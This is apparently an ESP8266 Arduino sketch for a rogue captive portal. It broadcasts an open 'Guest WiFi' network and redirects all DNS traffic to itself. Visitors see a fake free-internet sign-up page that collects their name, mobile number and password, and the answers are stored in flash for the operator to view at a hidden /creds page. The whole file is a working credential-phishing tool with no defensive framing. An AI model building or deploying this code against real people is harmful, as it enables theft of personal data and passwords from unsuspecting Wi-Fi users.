#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// WiFi Settings
#define SSID_NAME "Guest WiFi"
#define SUBTITLE "Secure free internet access."
#define TITLE "WiFi Access"
#define BODY "Sign up for free guest internet access."
#define POST_TITLE "Validating..."
#define POST_BODY "<div class='loader'></div><p>Your connection is being validated.</p>"
#define PASS_TITLE "Stored Credentials"
#define CLEAR_TITLE "Cleared"

// System Settings
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);  // Alternate: 192.168.4.1

String data = "", Credentials = "";
int savedData = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Input Sanitization
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  return a;
}

// Page Header
String header(String title) {
  String css = 
    "body { font-family: Arial, sans-serif; background: #f8f9fa; color: #333; text-align: center; }"
    "nav { background: #007bff; color: #fff; padding: 15px; font-size: 22px; font-weight: bold; }"
    ".container { width: 90%; max-width: 400px; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); margin: 20px auto; }"
    "form { display: flex; flex-direction: column; align-items: center; }"
    "input, button { width: 90%; max-width: 300px; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }"
    "button { background: #007bff; color: #fff; font-size: 16px; border: none; cursor: pointer; }"
    "button:hover { background: #0056b3; }"
    ".loader { border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }"
    "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
    "ul { list-style-type: none; padding: 0; }"
    "li { background: #f1f1f1; padding: 10px; margin: 5px; border-radius: 5px; text-align: left; }";
  
  return "<!DOCTYPE html><html><head><title>"+title+"</title>"
         "<meta name='viewport' content='width=device-width, initial-scale=1'>"
         "<style>" + css + "</style></head><body><nav>" + SSID_NAME + "</nav>";
}

// Landing Page
String index() {
  return header(TITLE) + 
    "<div class='container'><h2>" + BODY + "</h2>"
    "<form action='/post' method='post'>"
    "<label>Name:</label><input type='text' name='name' required>"
    "<label>Mobile Number:</label><input type='tel' name='mobile' required>"
    "<label>New Password:</label><input type='password' name='password' required>"
    "<button type='submit'>Connect</button></form></div></body></html>";
}

// Credentials Storage Page (To View Saved Data)
String creds() {
  readData();
  return header(PASS_TITLE) + 
    "<div class='container'><h2>Saved Logins</h2><ul>" + Credentials + "</ul>"
    "<button onclick=\"window.location.href='/clear'\">Clear All Credentials</button></div></body></html>";
}

// Submit Data & Save Credentials
String posted() {
  String name = input("name");
  String mobile = input("mobile");
  String password = input("password");

  readData();
  Credentials = data + "<li><b>Name:</b> " + name + "<br><b>Mobile:</b> " + mobile + "<br><b>Password:</b> " + password + "</li>";
  data = Credentials;
  writeData(data);
  savedData = 1;

  return header(POST_TITLE) + "<div class='container'>" + POST_BODY + "</div></body></html>";
}

// Clear Credentials
String clear() {
  Credentials = "";
  data = "";
  savedData = 0;
  deleteData();
  return header(CLEAR_TITLE) + "<div class='container'><p>Credentials cleared.</p></div></body></html>";
}

// File Operations for Storing Data
void readData() {
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) return;

  data = "";
  char buffer[1000];
  int i = 0;

  while (file.available()) {
    buffer[i] = (file.read());
    i++;
  }
  buffer[i] = '\0';
  file.close();

  data = String(buffer);
  if (data != "") savedData = 1;
}

void writeData(String data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  file.print(data);
  delay(1);
  file.close();
}

void deleteData() {
  LittleFS.remove("/SavedFile.txt");
}

// ESP8266 Setup
void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); });
  webServer.on("/clear", []() { webServer.send(200, "text/html", clear()); });
  webServer.on("/creds", []() { webServer.send(200, "text/html", creds()); });
  webServer.onNotFound([]() { webServer.send(200, "text/html", index()); });

  webServer.begin();
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("LittleFS Mount Failed");
    return;
  }
  readData();
}

// Main Loop
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
